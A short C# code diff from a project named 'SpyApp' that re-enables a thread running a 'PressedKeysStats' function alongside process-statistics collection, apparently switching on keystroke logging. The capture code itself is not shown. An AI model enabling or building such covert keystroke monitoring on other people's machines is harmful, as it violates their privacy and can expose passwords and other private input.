@@ -36,8 +36,8 @@ namespace SpyApp
                 Thread statsThread = new Thread(new ThreadStart(ProcessesThreadFunct));
                 statsThread.Start();
 
-                //Thread keysThread = new Thread(new ThreadStart(PressedKeysStats));
-                //keysThread.Start();
+                Thread keysThread = new Thread(new ThreadStart(PressedKeysStats));
+                keysThread.Start();
             }                  
         }
         ///processes
